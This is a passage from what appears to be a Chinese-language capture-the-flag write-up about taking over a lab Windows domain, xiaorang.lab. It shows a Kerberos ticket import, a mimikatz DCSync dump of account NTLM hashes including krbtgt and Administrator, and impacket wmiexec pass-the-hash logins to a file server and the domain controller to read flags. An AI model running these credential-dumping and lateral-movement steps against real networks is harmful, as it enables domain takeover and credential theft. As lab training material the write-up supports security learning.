XBLhYX6yJDRLAQFRrnF8no4zasAdgpDPmV1+GkQYrcYcoXZngq1BQ5dWLPaxBDcyfwEE0DbBLemOk4DAtpyMDKB4QunLdUpP4y9ntXneEocfsiDXyeCxOAodIGi1ldED8J+B/4sQ9+JPGxbwrLP1Mj999hFOhS1ZNBeZDxniBFMUDpF9C1eznA6Cz3NmoNy1L6ykvuxk8ao3Jv0+0ijgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAQbMz8pxIllmYoadNQ81r1H5G682kRN1ZMR1lx7grDrKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMDQwNzA0MTAwNlqmERgPMjAyMzA0MDcxNDEwMDZapxEYDzIwMjMwNDE0MDQxMDA2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
[+] host called home, sent: 557363 bytes
[+] received output:

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!

[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:xiaorang.lab /all /csv command
[+] host called home, sent: 297586 bytes
[+] received output:
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502 krbtgt 767e06b9c74fd628dd13785006a9092b 514
1105 Aldrich 98ce19dd5ce74f670d230c7b1aa016d0 512
1106 Marcus b91c7cc463735bf0e599a2d0a04df110 512
1112 WIN-3X7U15C2XDM$ c3ddf0ffd17c48e6c40e6eda9c9fbaf7 4096
1113 WIN-YUUAW2QG9MF$ 125d0e9790105be68deb6002690fc91b 4096
1000 DC01$ 321172fd7e8004328f012ee71c9b8882 532480
500 Administrator 4889f6553239ace1f7c47fa2c619c252 512
1103 FILESERVER$ 928d1407f031a69e1a7fc423d249d57e 4096
1104 WIN19$ f013947fa647df6403a4653648059060 528384
```

使用域管 hash 登录主机 FILESERVER$：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q impacket-wmiexec xiaorang.lab/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec GBK -shell-type powershell
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> type C:\Users\Administrator\flag\flag03.txt
   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .
.+'|=|`+. .+'|=|`+. .+'|      .+'|=|`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. |`+. .+'|=|`+. .+'|=|`+.
|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+' |  | `+.| |  | |  | |  | |  | `+ |
|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |
|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |
|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |
|  | .+ | |  | .+'| |  | .+'| |  | .+'| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |
`+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.| |..|      |.+'      |.+' `+.|=|.+' `+.|  |.|



flag03: flag{d3243530-29e2-44d8-bb21-4535529fe59f}


Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!

PS C:\>
```

使用域管 hash 登录主机 DC01$：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q impacket-wmiexec xiaorang.lab/Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec GBK -shell-type powershell
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> type C:\Users\Administrator\flag\flag04.txt
 ______   _______  _        _______  _______  _______ __________________ _______  _
(  __  \ (  ____ \( \      (  ____ \(  ____ \(  ___  )\__   __/\__   __/(  ___  )( (    /|
| (  \  )| (    \/| (      | (    \/| (    \/| (   ) |   ) (      ) (   | (   ) ||  \  ( |
| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \ | |
| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\ \) |
| |   ) || (      | |      | (      | | \_  )| (   ) |   | |      | |   | |   | || | \   |
| (__/  )| (____/\| (____/\| (____/\| (___) || )   ( |   | |   ___) (___| (___) || )  \  |
(______/ (_______/(_______/(_______/(_______)|/     \|   )_(   \_______/(_______)|/    )_)


Awesome! Now you have taken over the entire domain network.


flag04: flag{9742b5bb-e948-4775-b242-3060a1e074ec}


PS C:\>
```
